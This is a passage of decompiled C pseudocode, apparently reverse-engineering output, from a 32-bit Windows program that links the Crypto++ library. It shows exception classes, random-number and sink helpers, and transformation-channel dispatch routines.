  v3 = sub_40BC7D(Src);
  v5 = sub_40E1DC(a3, v4, 0, Src, v3);
  std::string::string(v5);
  return a1;
}
// 40C8E1: variable 'v4' is possibly undefined
// 404F75: using guessed type _DWORD __stdcall std::string::string(_DWORD);

//----- (0040C8F6) --------------------------------------------------------
_DWORD *__cdecl sub_40C8F6(_DWORD *a1, char *Src, _DWORD *a3)
{
  bool v3; // cf
  _BYTE *v4; // eax
  unsigned int v5; // eax
  unsigned int v6; // eax
  int v7; // edx

  a1[5] = 15;
  v3 = a1[5] < 0x10u;
  a1[4] = 0;
  if ( v3 )
    v4 = a1;
  else
    v4 = (_BYTE *)*a1;
  *v4 = 0;
  v5 = sub_40BC7D(Src);
  sub_4093D7(a1, a3[4] + v5);
  v6 = sub_40BC7D(Src);
  sub_40C68E((_BYTE **)a1, v7, Src, v6);
  sub_40C5F5((const void **)a1, a3, 0, 0xFFFFFFFF);
  return a1;
}
// 40C952: variable 'v7' is possibly undefined

//----- (0040C96A) --------------------------------------------------------
int __cdecl sub_40C96A(int a1, unsigned int a2)
{
  if ( a2 >= 0x20 )
    return a1;
  else
    return a1 & ((1 << a2) - 1);
}

//----- (0040C983) --------------------------------------------------------
_DWORD *__cdecl sub_40C983(_DWORD *a1, int a2, unsigned int a3)
{
  int v3; // edi
  _DWORD *v4; // esi
  char v5; // bl
  char v6; // bl
  int v7; // edx
  char v8; // al
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  char v12; // [esp+1Bh] [ebp-41h]
  int v13[6]; // [esp+1Ch] [ebp-40h] BYREF
  _DWORD Src[10]; // [esp+34h] [ebp-28h] BYREF
  unsigned int v15; // [esp+6Ch] [ebp+10h]

  v3 = a2;
  v4 = a1;
  v5 = ~(a3 >> 26) & 0x20 | 0x41;
  v15 = a3 & 0x7FFFFFFF;
  if ( a2 )
  {
    v12 = 0;
    if ( a2 < 0 )
    {
      v12 = 1;
      v3 = -a2;
    }
    Src[5] = 15;
    Src[4] = 0;
    LOBYTE(Src[0]) = 0;
    Src[9] = 0;
    if ( v3 > 0 )
    {
      v6 = v5 - 10;
      do
      {
        v7 = v3 % v15;
        v3 /= v15;
        v8 = v6;
        if ( v7 < 10 )
          v8 = 48;
        v9 = sub_40BF28(v13, v7 + v8, Src);
        unknown_libname_21(Src, v9);
        sub_40BAFC(v13, 1, 0);
      }
      while ( v3 > 0 );
      v4 = a1;
    }
    if ( v12 )
    {
      v10 = sub_40C8F6(v13, "-", Src);
      unknown_libname_21(Src, v10);
      sub_40BAFC(v13, 1, 0);
    }
    v4[4] = 0;
    v4[5] = 15;
    *(_BYTE *)v4 = 0;
    sub_40C5A0(v4, Src);
    sub_40BAFC(Src, 1, 0);
  }
  else
  {
    sub_40AAE3((int)a1, "0");
  }
  return v4;
}

//----- (0040CA94) --------------------------------------------------------
int __thiscall sub_40CA94(int this, unsigned int a2)
{
  *(_BYTE *)(this + 257) = 0;
  *(_DWORD *)(this + 264) = -1;
  *(_DWORD *)(this + 268) = a2;
  *(_DWORD *)(this + 272) = sub_40E19D((_BYTE *)this, a2, 0);
  return this;
}

//----- (0040CAC3) --------------------------------------------------------
void *__thiscall sub_40CAC3(void *this, char a2)
{
  int v4[10]; // [esp+10h] [ebp-90h] BYREF
  int pExceptionObject[10]; // [esp+38h] [ebp-68h] BYREF
  _DWORD v6[6]; // [esp+60h] [ebp-40h] BYREF
  _DWORD Src[9]; // [esp+78h] [ebp-28h] BYREF
  int v8; // [esp+9Ch] [ebp-4h]

  if ( a2 && sub_406775() )
  {
    if ( !sub_4257AB() && !sub_406775() )
    {
      sub_40AAE3((int)Src, "Cryptographic algorithms are disabled before the power-up self tests are performed.");
      v8 = 0;
      sub_406307(pExceptionObject, 6, Src);
      pExceptionObject[0] = (int)&CryptoPP::SelfTestFailure::`vftable';
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVSelfTestFailure_CryptoPP__);
    }
    if ( sub_4257AB() == 1 )
    {
      sub_40AAE3((int)v6, "Cryptographic algorithms are disabled after a power-up self test failed.");
      v8 = 1;
      sub_406307(v4, 6, v6);
      v4[0] = (int)&CryptoPP::SelfTestFailure::`vftable';
      _CxxThrowException(v4, (_ThrowInfo *)&_TI3_AVSelfTestFailure_CryptoPP__);
    }
  }
  return this;
}
// 46C654: using guessed type void *CryptoPP::SelfTestFailure::`vftable';
// 40CAC3: using guessed type _DWORD Src[9];
// 40CAC3: using guessed type _DWORD var_40[6];

//----- (0040CB81) --------------------------------------------------------
std::exception *__thiscall sub_40CB81(std::exception *this, struct std::exception *a2)
{
  sub_40663E(this, a2);
  *(_DWORD *)this = &CryptoPP::InvalidCiphertext::`vftable';
  return this;
}
// 46C440: using guessed type void *CryptoPP::InvalidCiphertext::`vftable';

//----- (0040CBA2) --------------------------------------------------------
std::exception *__thiscall sub_40CBA2(std::exception *this, struct std::exception *a2)
{
  sub_40663E(this, a2);
  *(_DWORD *)this = &CryptoPP::InvalidKeyLength::`vftable';
  return this;
}
// 46C51C: using guessed type void *CryptoPP::InvalidKeyLength::`vftable';

//----- (0040CBC3) --------------------------------------------------------
_DWORD *__thiscall sub_40CBC3(_DWORD *this, _DWORD *a2, int a3)
{
  _DWORD *v4; // esi
  char *v5; // eax
  _BYTE **v6; // eax
  _DWORD *v7; // eax
  _DWORD v9[6]; // [esp+14h] [ebp-70h] BYREF
  int v10[6]; // [esp+2Ch] [ebp-58h] BYREF
  int v11[6]; // [esp+44h] [ebp-40h] BYREF
  _DWORD v12[9]; // [esp+5Ch] [ebp-28h] BYREF
  int v13; // [esp+80h] [ebp-4h]

  v4 = sub_40BF8D(v9, a3, 0xAu);
  v13 = 0;
  v5 = (char *)sub_40C853(v10, a2, ": ");
  LOBYTE(v13) = 1;
  v6 = (_BYTE **)sub_409630((int)v11, v5, v4);
  LOBYTE(v13) = 2;
  v7 = (_DWORD *)sub_40BEFB((int)v12, v6, " is not a valid key length");
  LOBYTE(v13) = 3;
  sub_406307(this, 1, v7);
  *this = &CryptoPP::InvalidArgument::`vftable';
  sub_40BAFC(v12, 1, 0);
  sub_40BAFC(v11, 1, 0);
  sub_40BAFC(v10, 1, 0);
  sub_40BAFC(v9, 1, 0);
  *this = &CryptoPP::InvalidKeyLength::`vftable';
  return this;
}
// 46B464: using guessed type void *CryptoPP::InvalidArgument::`vftable';
// 46C51C: using guessed type void *CryptoPP::InvalidKeyLength::`vftable';
// 40CBC3: using guessed type _DWORD var_70[6];
// 40CBC3: using guessed type _DWORD var_28[9];

//----- (0040CC70) --------------------------------------------------------
std::exception *__thiscall sub_40CC70(std::exception *this, struct std::exception *a2)
{
  sub_40663E(this, a2);
  *(_DWORD *)this = &CryptoPP::BufferedTransformation::NoChannelSupport::`vftable';
  return this;
}
// 46C4A4: using guessed type void *CryptoPP::BufferedTransformation::NoChannelSupport::`vftable';

//----- (0040CC91) --------------------------------------------------------
_DWORD *__thiscall sub_40CC91(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v5[10]; // [esp+14h] [ebp-28h] BYREF

  v3 = sub_40C853(v5, a2, ": this object doesn't support multiple channels");
  v5[9] = 0;
  sub_406307(this, 0, v3);
  *this = &CryptoPP::NotImplemented::`vftable';
  sub_40BAFC(v5, 1, 0);
  *this = &CryptoPP::BufferedTransformation::NoChannelSupport::`vftable';
  return this;
}
// 46B470: using guessed type void *CryptoPP::NotImplemented::`vftable';
// 46C4A4: using guessed type void *CryptoPP::BufferedTransformation::NoChannelSupport::`vftable';

//----- (0040CCE7) --------------------------------------------------------
_DWORD *__thiscall sub_40CCE7(_DWORD *this, int a2, int a3, int a4, int a5)
{
  sub_41D430(this, 0);
  this[6] = a2;
  this[7] = a3;
  *this = &CryptoPP::PK_DefaultEncryptionFilter::`vftable';
  this[1] = &CryptoPP::PK_DefaultEncryptionFilter::`vftable';
  this[8] = a5;
  sub_424BAD(this + 9, 0);
  sub_408A33(this + 19, 0);
  sub_41D8CB(this, a4);
  return this;
}
// 46C890: using guessed type void *CryptoPP::PK_DefaultEncryptionFilter::`vftable';
// 46C954: using guessed type void *CryptoPP::PK_DefaultEncryptionFilter::`vftable';

//----- (0040CD50) --------------------------------------------------------
std::exception *__thiscall sub_40CD50(std::exception *this, struct std::exception *a2)
{
  sub_40663E(this, a2);
  *(_DWORD *)this = &CryptoPP::SelfTestFailure::`vftable';
  return this;
}
// 46C654: using guessed type void *CryptoPP::SelfTestFailure::`vftable';

//----- (0040CD76) --------------------------------------------------------
char __thiscall sub_40CD76(int this)
{
  return sub_40E1C0(
           (_BYTE *)this,
           *(_BYTE **)(this + 272),
           *(_DWORD *)((*(_DWORD *)(this + 264) < *(_DWORD *)(this + 268) ? 0xFFFFFFFC : 0) + this + 268));
}

//----- (0040CD9A) --------------------------------------------------------
int __thiscall sub_40CD9A(_DWORD *this)
{
  sub_4089EF(this + 19);
  sub_424C9A(this + 9);
  return sub_405EEF(this + 3);
}

//----- (0040CDB6) --------------------------------------------------------
char *__thiscall sub_40CDB6(char *this, char a2)
{
  char *v2; // ecx
  char *v3; // esi

  v2 = this - 4;
  v3 = v2;
  if ( (a2 & 1) != 0 )
    sub_42CF7C(v2);
  return v3;
}

//----- (0040CDE0) --------------------------------------------------------
void *__thiscall sub_40CDE0(void *Block, char a2)
{
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (0040CDFA) --------------------------------------------------------
_DWORD *__thiscall sub_40CDFA(_DWORD *Block, char a2)
{
  sub_40CD9A(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (0040CE19) --------------------------------------------------------
unsigned int __thiscall sub_40CE19(
        void *this,
        unsigned int a2,
        unsigned int a3,
        unsigned int a4,
        unsigned int a5,
        char a6)
{
  unsigned int v6; // ebp
  unsigned int v7; // esi
  char v8; // al
  int v9; // edx
  int v10; // ebx
  unsigned int v11; // ecx
  int v12; // ebx
  unsigned int v13; // edi
  unsigned int v14; // ebx
  bool v15; // dl
  int v17; // [esp+10h] [ebp-10h]
  int v18; // [esp+14h] [ebp-Ch]
  int v20; // [esp+1Ch] [ebp-4h]
  bool v21; // [esp+2Ch] [ebp+Ch]
  int v22; // [esp+34h] [ebp+14h]

  v6 = a5;
  v7 = (*(int (__fastcall **)(void *))(*(_DWORD *)this + 16))(this);
  v8 = a6;
  v9 = v7;
  if ( (a6 & 3) != 0 )
    v9 = 0;
  v10 = 0;
  v11 = a3;
  if ( a3 )
    v10 = v7;
  v20 = v9;
  v18 = v10;
  v12 = v7;
  if ( (a6 & 2) != 0 )
    v12 = 0;
  v13 = a2;
  v17 = v12;
  v14 = a4;
  if ( (a6 & 8) != 0 )
  {
    v18 = -v18;
    v13 = a5 - v7 + a2;
    v20 = -v9;
    v11 = a5 - v7 + a3;
    a3 = v11;
    v14 = a5 - v7 + a4;
    v17 = -v17;
    v8 = a6;
  }
  v15 = v11 && (v8 & 4) != 0;
  v21 = v15;
  if ( a5 >= v7 )
  {
    v22 = v8 & 1;
    do
    {
      if ( v15 )
      {
        sub_420CB2(v14, v11, v13, v7);
        (*(void (__stdcall **)(unsigned int, _DWORD, unsigned int))(*(_DWORD *)this + 12))(v14, 0, v14);
      }
      else
      {
        (*(void (__stdcall **)(unsigned int, unsigned int, unsigned int))(*(_DWORD *)this + 12))(v13, v11, v14);
      }
      if ( v22 )
        ++*(_BYTE *)(v7 + v13 - 1);
      v6 -= v7;
      v11 = v18 + a3;
      v13 += v20;
      v14 += v17;
      v15 = v21;
      a3 += v18;
    }
    while ( v6 >= v7 );
  }
  return v6;
}

//----- (0040CF0E) --------------------------------------------------------
int __stdcall sub_40CF0E(int a1)
{
  sub_40AAE3(a1, "BitBucket");
  return a1;
}

//----- (0040CF2C) --------------------------------------------------------
int __stdcall sub_40CF2C(int a1)
{
  sub_40AAE3(a1, "NullRNG");
  return a1;
}

//----- (0040CF4A) --------------------------------------------------------
char __thiscall sub_40CF4A(int *this)
{
  bool v2; // zf
  int v3; // eax
  int v4; // eax

  v2 = (*(int (__thiscall **)(int *))(*this + 160))(this) == 0;
  v3 = *this;
  if ( v2 )
    return (*(int (__thiscall **)(int *))(v3 + 92))(this) != 0;
  v4 = (*(int (__thiscall **)(int *))(v3 + 160))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v4 + 96))(v4);
}

//----- (0040CF75) --------------------------------------------------------
char __thiscall sub_40CF75(int *this)
{
  bool v2; // zf
  int v3; // eax
  int v4; // eax
  char v6; // [esp+7h] [ebp-1h] BYREF

  v2 = (*(int (__thiscall **)(int *))(*this + 160))(this) == 0;
  v3 = *this;
  if ( v2 )
    return (*(int (__thiscall **)(int *, char *))(v3 + 80))(this, &v6) != 0;
  v4 = (*(int (__thiscall **)(int *))(v3 + 160))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v4 + 64))(v4);
}

//----- (0040CFAC) --------------------------------------------------------
int __thiscall sub_40CFAC(void *this, int a2)
{
  int v3; // eax
  int v4; // eax

  if ( !(*(int (__thiscall **)(void *))(*(_DWORD *)this + 164))(this) )
    return (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 168))(this, a2);
  v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 164))(this);
  if ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v3 + 156))(v3) )
    return (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 168))(this, a2);
  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 164))(this);
  return (*(int (__thiscall **)(int, int))(*(_DWORD *)v4 + 172))(v4, a2);
}

//----- (0040CFFD) --------------------------------------------------------
int __thiscall sub_40CFFD(int *this, int a2, int a3)
{
  int v3; // eax
  _DWORD *v5; // eax
  char v6[24]; // [esp+10h] [ebp-50h] BYREF
  _DWORD pExceptionObject[14]; // [esp+28h] [ebp-38h] BYREF

  v3 = *this;
  if ( *(_DWORD *)(a2 + 16) )
  {
    v5 = (_DWORD *)(*(int (__cdecl **)(char *))(v3 + 8))(v6);
    pExceptionObject[13] = 0;
    sub_40CC91(pExceptionObject, v5);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AUNoChannelSupport_BufferedTransformation_CryptoPP__);
  }
  return (*(int (__stdcall **)(int))(v3 + 12))(a3);
}
// 40CFFD: using guessed type char var_50[24];

//----- (0040D046) --------------------------------------------------------
int __thiscall sub_40D046(int *this, int a2, int a3, int a4, int a5)
{
  int v5; // eax
  _DWORD *v7; // eax
  char v8[24]; // [esp+10h] [ebp-50h] BYREF
  _DWORD pExceptionObject[14]; // [esp+28h] [ebp-38h] BYREF

  v5 = *this;
  if ( *(_DWORD *)(a2 + 16) )
  {
    v7 = (_DWORD *)(*(int (__cdecl **)(char *))(v5 + 8))(v8);
    pExceptionObject[13] = 0;
    sub_40CC91(pExceptionObject, v7);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AUNoChannelSupport_BufferedTransformation_CryptoPP__);
  }
  return (*(int (__stdcall **)(int, int, int))(v5 + 44))(a3, a4, a5);
}
// 40D046: using guessed type char var_50[24];

//----- (0040D094) --------------------------------------------------------
BOOL __thiscall sub_40D094(void *this, int a2, int a3, int a4)
{
  int v4; // edx

  v4 = a3 + 1;
  if ( a3 < 0 )
    v4 = -1;
  return (*(int (__stdcall **)(int, _DWORD, _DWORD, int, int))(*(_DWORD *)this + 136))(a2, 0, 0, v4, a4) != 0;
}

//----- (0040D0C5) --------------------------------------------------------
int __thiscall sub_40D0C5(int *this, int a2, int a3, int a4)
{
  int v4; // eax
  _DWORD *v6; // eax
  char v7[24]; // [esp+10h] [ebp-50h] BYREF
  _DWORD pExceptionObject[14]; // [esp+28h] [ebp-38h] BYREF

  v4 = *this;
  if ( *(_DWORD *)(a2 + 16) )
  {
    v6 = (_DWORD *)(*(int (__cdecl **)(char *))(v4 + 8))(v7);
    pExceptionObject[13] = 0;
    sub_40CC91(pExceptionObject, v6);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AUNoChannelSupport_BufferedTransformation_CryptoPP__);
  }
  return (*(int (__stdcall **)(int, int))(v4 + 48))(a3, a4);
}
// 40D0C5: using guessed type char var_50[24];

//----- (0040D110) --------------------------------------------------------
int __thiscall sub_40D110(int *this, int a2, int a3, int a4, int a5, int a6)
{
  int v6; // eax
  _DWORD *v8; // eax
  char v9[24]; // [esp+10h] [ebp-50h] BYREF
  _DWORD pExceptionObject[14]; // [esp+28h] [ebp-38h] BYREF

  v6 = *this;
  if ( *(_DWORD *)(a2 + 16) )
  {
    v8 = (_DWORD *)(*(int (__cdecl **)(char *))(v6 + 8))(v9);
    pExceptionObject[13] = 0;
    sub_40CC91(pExceptionObject, v8);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AUNoChannelSupport_BufferedTransformation_CryptoPP__);
  }
  return (*(int (__stdcall **)(int, int, int, int))(v6 + 20))(a3, a4, a5, a6);
}
// 40D110: using guessed type char var_50[24];

//----- (0040D162) --------------------------------------------------------
int __thiscall sub_40D162(int *this, int a2, int a3, int a4, int a5, int a6)
{
  int v6; // eax

  v6 = *this;
  if ( *(_DWORD *)(a2 + 16) )
    return (*(int (__stdcall **)(int, int, int, int, int))(v6 + 136))(a2, a3, a4, a5, a6);
  else
    return (*(int (__stdcall **)(int, int, int, int))(v6 + 24))(a3, a4, a5, a6);
}

//----- (0040D18C) --------------------------------------------------------
int __thiscall sub_40D18C(_DWORD *this, int a2, unsigned int a3, int a4, int a5)
{
  unsigned __int32 v5; // edx

  v5 = a3;
  if ( a4 )
    v5 = _byteswap_ulong(a3);
  this[2] = v5;
  return (*(int (__stdcall **)(int, _DWORD *, int, _DWORD, int))(*this + 136))(a2, this + 2, 4, 0, a5);
}

//----- (0040D1B6) --------------------------------------------------------
int __thiscall sub_40D1B6(void *this, int a2, int a3, int a4)
{
  int v5; // edi

  v5 = 0;
  if ( (*(int (__thiscall **)(void *))(*(_DWORD *)this + 160))(this) )
  {
    (*(void (__thiscall **)(void *))(*(_DWORD *)this + 160))(this);
    return sub_40D1B6(a2, a3, a4);
  }
  return v5;
}

//----- (0040D1EE) --------------------------------------------------------
_DWORD *__thiscall sub_40D1EE(void *this, int a2, int a3, int a4)
{
  _DWORD *v5; // ecx
  _DWORD *result; // eax

  v5 = operator new(0x5Cu);
  result = 0;
  if ( v5 )
    return sub_40CCE7(v5, a2, (int)this, a3, a4);
  return result;
}

//----- (0040D229) --------------------------------------------------------
int __thiscall sub_40D229(int *this, int a2)
{
  int v3; // esi
  void ***v4; // eax

  v3 = *this;
  v4 = sub_40DBEE();
  return (*(int (__thiscall **)(int *, void ***, _DWORD *, int, _DWORD))(v3 + 36))(this, v4, dword_48C040, a2, 0);
}
// 48C040: using guessed type _DWORD dword_48C040[6];

//----- (0040D24A) --------------------------------------------------------
int __thiscall sub_40D24A(void *this, int a2, int a3, int a4)
{
  return (*(int (__thiscall **)(void *, int, int))(*(_DWORD *)this + 32))(this, a2, a4);
}

//----- (0040D25A) --------------------------------------------------------
int __thiscall sub_40D25A(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 20))(this) & 1;
}

//----- (0040D263) --------------------------------------------------------
void __noreturn sub_40D263()
{
  int pExceptionObject[10]; // [esp+10h] [ebp-50h] BYREF
  _DWORD Src[10]; // [esp+38h] [ebp-28h] BYREF

  sub_40AAE3((int)Src, "NullRNG: NullRNG should only be passed to functions that don't need to generate random bytes");
  Src[9] = 0;
  sub_406307(pExceptionObject, 0, Src);
  pExceptionObject[0] = (int)&CryptoPP::NotImplemented::`vftable';
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 40D263: using guessed type void __noreturn sub_40D263();
// 46B470: using guessed type void *CryptoPP::NotImplemented::`vftable';

//----- (0040D2A4) --------------------------------------------------------
int __thiscall sub_40D2A4(int *this, int a2, int a3)
{
  int v3; // eax
  int v5[6]; // [esp+10h] [ebp-30h] BYREF
  __int64 v6; // [esp+28h] [ebp-18h]
  int v7; // [esp+3Ch] [ebp-4h]

  v5[0] = (int)&CryptoPP::ArraySink::`vftable';
  v5[1] = (int)&CryptoPP::ArraySink::`vftable';
  v5[3] = a2;
  v5[4] = a3;
  v6 = 0i64;
  v3 = *this;
  v7 = 2;
  return (*(int (__thiscall **)(int *, int *, void *, int, _DWORD))(v3 + 36))(this, v5, &unk_48C040, a3, 0);
}
// 46C22C: using guessed type void *CryptoPP::ArraySink::`vftable';
// 46C2E0: using guessed type void *CryptoPP::ArraySink::`vftable';

//----- (0040D2F2) --------------------------------------------------------
char __fastcall sub_40D2F2(int a1)
{
  char v2; // [esp+1h] [ebp-1h] BYREF

  v2 = HIBYTE(a1);
  (*(void (__stdcall **)(char *, int))(*(_DWORD *)a1 + 32))(&v2, 1);
  return v2;
}

//----- (0040D308) --------------------------------------------------------
char __userpurge sub_40D308@<al>(int a1@<ecx>, _DWORD *a2@<ebx>, int a3@<ebp>, int a4, int a5, int a6, int a7)
{
  unsigned int v7; // esi
  int v8; // ecx
  unsigned int v9; // edi

  *(_DWORD *)(a3 - 312) = a1;
  *(_DWORD *)(a3 - 316) = a2[2];
  *(_DWORD *)(a3 - 320) = a2[3];
  sub_40CA94(a3 - 304, 0x100u);
  *(_DWORD *)(a3 - 4) = 0;
  v7 = a2[4];
  v8 = a2[5];
  while ( 1 )
  {
    *(_DWORD *)(a3 - 308) = v8;
    if ( !(v8 | v7) )
      break;
    v9 = *(_DWORD *)(a3 - 36);
    if ( !v8 && v7 < v9 )
      v9 = v7;
    (*(void (__thiscall **)(_DWORD, _DWORD, unsigned int))(**(_DWORD **)(a3 - 312) + 32))(
      *(_DWORD *)(a3 - 312),
      *(_DWORD *)(a3 - 32),
      v9);
    (*(void (__thiscall **)(_DWORD, _DWORD, _DWORD, unsigned int, _DWORD, int))(**(_DWORD **)(a3 - 316) + 136))(
      *(_DWORD *)(a3 - 316),
      *(_DWORD *)(a3 - 320),
      *(_DWORD *)(a3 - 32),
      v9,
      0,
      1);
    v8 = (__PAIR64__(*(_DWORD *)(a3 - 308), v7) - v9) >> 32;
    v7 -= v9;
  }
  return sub_40CD76(a3 - 304);
}

//----- (0040D3B4) --------------------------------------------------------
int __thiscall sub_40D3B4(void *this, int a2, int a3)
{
  unsigned int v4; // esi
  unsigned int v5; // ebp
  unsigned int v6; // eax

  v4 = a3 - a2;
  a3 -= a2;
  v5 = sub_40A926(&a3);
  do
  {
    (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 32))(this, &a3, 4);
    v6 = sub_40C96A(a3, v5);
    a3 = v6;
  }
  while ( v6 > v4 );
  return a2 + v6;
}

//----- (0040D400) --------------------------------------------------------
int __thiscall sub_40D400(int *this, int a2)
{
  bool v3; // zf
  int v4; // eax
  int v5; // eax

  v3 = (*(int (__thiscall **)(int *))(*this + 164))(this) == 0;
  v4 = *this;
  if ( v3 )
    return (*(int (__thiscall **)(int *, int, int))(v4 + 68))(this, a2, 1);
  v5 = (*(int (__thiscall **)(int *))(v4 + 164))(this);
  return (*(int (__thiscall **)(int, int))(*(_DWORD *)v5 + 72))(v5, a2);
}

//----- (0040D42E) --------------------------------------------------------
int __thiscall sub_40D42E(int *this, int a2, int a3)
{
  int v4; // eax
  int v6; // eax
  int v7[2]; // [esp+10h] [ebp-38h] BYREF
  int v8[6]; // [esp+18h] [ebp-30h] BYREF
  __int64 v9; // [esp+30h] [ebp-18h]
  int v10; // [esp+44h] [ebp-4h]

  if ( (*(int (__thiscall **)(int *))(*this + 164))(this) )
  {
    v4 = (*(int (__thiscall **)(int *))(*this + 164))(this);
    return (*(int (__thiscall **)(int, int, int))(*(_DWORD *)v4 + 68))(v4, a2, a3);
  }
  else
  {
    v8[0] = (int)&CryptoPP::ArraySink::`vftable';
    v8[1] = (int)&CryptoPP::ArraySink::`vftable';
    v8[3] = a2;
    v8[4] = a3;
    v9 = 0i64;
    v6 = *this;
    v7[1] = 0;
    v10 = 2;
    v7[0] = a3;
    (*(void (__thiscall **)(int *, int *, int *, _DWORD *, int))(v6 + 124))(this, v8, v7, dword_48C040, 1);
    return v7[0];
  }
}
// 46C22C: using guessed type void *CryptoPP::ArraySink::`vftable';
// 46C2E0: using guessed type void *CryptoPP::ArraySink::`vftable';
// 48C040: using guessed type _DWORD dword_48C040[6];

//----- (0040D4AE) --------------------------------------------------------
int __thiscall sub_40D4AE(void *this, int *a2, int *a3)
{
  int v4; // eax
  char v5; // al
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // esi
  _DWORD v11[3]; // [esp+10h] [ebp-38h] BYREF
  _DWORD v12[5]; // [esp+1Ch] [ebp-2Ch] BYREF
  int v13[5]; // [esp+30h] [ebp-18h] BYREF
  int v14; // [esp+44h] [ebp-4h]

  v12[4] = this;
  sub_406A26(v11, 0, 0);
  v14 = 0;
  v4 = *a2;
  v13[0] = 0;
  LOBYTE(v14) = 1;
  v5 = (*(int (__thiscall **)(int *, void *, void *, _DWORD *))(v4 + 4))(
         a2,
         &unk_46C65C,
         &CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor',
         v11);
  v14 = 0;
  if ( v5 )
  {
    v6 = v11[1];
    if ( LOBYTE(v11[0]) )
      v6 = v12[3];
    v13[0] = v6;
    sub_40DC48(this, v6);
    v7 = v11[2];
    if ( LOBYTE(v11[0]) )
      v7 = v12[2];
    v8 = sub_40DCBA((int *)this, v7);
  }
  else
  {
    if ( !(*(unsigned __int8 (__thiscall **)(int *, void *, const unsigned __int8 **, int *))(*a2 + 4))(
            a2,
            &unk_46C65C,
            &unsigned char const * `RTTI Type Descriptor',
            v13) )
    {
      sub_40DFA7(this);
      *a3 = 0;
      goto LABEL_11;
    }
    sub_40DC48(this, v13[0]);
    v8 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 32))(this);
  }
  *a3 = v8;
LABEL_11:
  v9 = v13[0];
  sub_4089EF(v12);
  return v9;
}
// 48D0BC: using guessed type const unsigned __int8 *unsigned char const * `RTTI Type Descriptor';
// 40D4AE: using guessed type int var_18[5];

//----- (0040D581) --------------------------------------------------------
int __thiscall sub_40D581(_DWORD *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(_DWORD *))(*(this - 1) + 160))(this - 1);
  if ( v1 )
    return (*(int (__thiscall **)(int))(*(_DWORD *)(v1 + 4) + 4))(v1 + 4);
  else
    return 0;
}

//----- (0040D59B) --------------------------------------------------------
int __thiscall sub_40D59B(void *this, int *a2, int a3)
{
  int v3; // edi
  int v4; // eax

  v3 = *a2;
  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 32))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(a2, a3, v4);
}

//----- (0040D5B7) --------------------------------------------------------
char __thiscall sub_40D5B7(void *this)
{
  char v2; // bl
  int v3; // eax

  v2 = 0;
  if ( (*(int (__thiscall **)(void *))(*(_DWORD *)this + 164))(this) )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 164))(this);
    return (*(int (__thiscall **)(int))(*(_DWORD *)v3 + 100))(v3);
  }
  return v2;
}

//----- (0040D5E1) --------------------------------------------------------
int __thiscall sub_40D5E1(_DWORD *this, int a2, int a3)
{
  int result; // eax

  result = (*(int (__thiscall **)(_DWORD *))(*(this - 1) + 164))(this - 1);
  if ( result )
    return (*(int (__thiscall **)(int, int, int))(*(_DWORD *)(result + 4) + 8))(result + 4, a2, a3);
  return result;
}

//----- (0040D5FB) --------------------------------------------------------
int __thiscall sub_40D5FB(int *this, _WORD *a2, int a3)
{
  int (__thiscall **v4)(int *, int, _DWORD); // esi
  int v5; // eax

  v4 = (int (__thiscall **)(int *, int, _DWORD))(*this + 84);
  v5 = sub_40D842(this, a2, a3);
  return (*v4)(this, v5, 0);
}

//----- (0040D61D) --------------------------------------------------------
void __noreturn sub_40D61D()
{
  int pExceptionObject[10]; // [esp+10h] [ebp-50h] BYREF
  _DWORD Src[10]; // [esp+38h] [ebp-28h] BYREF

  sub_40AAE3((int)Src, "RandomNumberGenerator: IncorporateEntropy not implemented");
  Src[9] = 0;
  sub_406307(pExceptionObject, 0, Src);
  pExceptionObject[0] = (int)&CryptoPP::NotImplemented::`vftable';
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 40D61D: using guessed type void __noreturn sub_40D61D();
// 46B470: using guessed type void *CryptoPP::NotImplemented::`vftable';

//----- (0040D65E) --------------------------------------------------------
int __thiscall sub_40D65E(void *this, int a2, int a3)
{
  return (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 28))(this, a2);
}

//----- (0040D66A) --------------------------------------------------------
void __noreturn sub_40D66A()
{
  int pExceptionObject[10]; // [esp+10h] [ebp-50h] BYREF
  _DWORD Src[10]; // [esp+38h] [ebp-28h] BYREF

  sub_40AAE3((int)Src, "BufferedTransformation: this object can't be reinitialized");
  Src[9] = 0;
  sub_406307(pExceptionObject, 0, Src);
  pExceptionObject[0] = (int)&CryptoPP::NotImplemented::`vftable';
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 40D66A: using guessed type void __noreturn sub_40D66A();
// 46B470: using guessed type void *CryptoPP::NotImplemented::`vftable';

//----- (0040D6AB) --------------------------------------------------------
int __thiscall sub_40D6AB(void *this)
{
  int v2; // eax
  void ***v4; // eax

  if ( (*(int (__thiscall **)(void *))(*(_DWORD *)this + 160))(this) )
  {
    v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 160))(this);
    return (*(int (__thiscall **)(int))(*(_DWORD *)v2 + 60))(v2);
  }
